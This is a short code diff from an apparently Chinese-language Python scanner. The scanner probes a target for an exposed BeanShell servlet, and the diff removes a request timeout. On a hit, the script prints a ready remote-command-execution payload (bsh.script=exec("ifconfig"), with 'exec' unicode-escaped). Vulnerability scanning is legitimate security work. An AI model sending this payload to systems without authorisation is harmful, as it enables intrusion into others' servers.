@@ -22,7 +22,7 @@ def main(target_url):
     }
     try:
         requests.packages.urllib3.disable_warnings()
-        response = requests.get(url=url, headers=headers, timeout=30)
+        response = requests.get(url=url, headers=headers)
         if response.status_code == 200 and 'BeanShell' in response.text:
             console.print(now_time() +  ' [SUCCESS]     BeanShell页面存在, 可能存在漏洞: {}'.format(url),style='bold green')
             console.print(now_time()+   ' [SUCCESS]     改漏洞使用方式POST请求：bsh.script=ex\u0065c("ifconfig");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw\n',style='bold green')
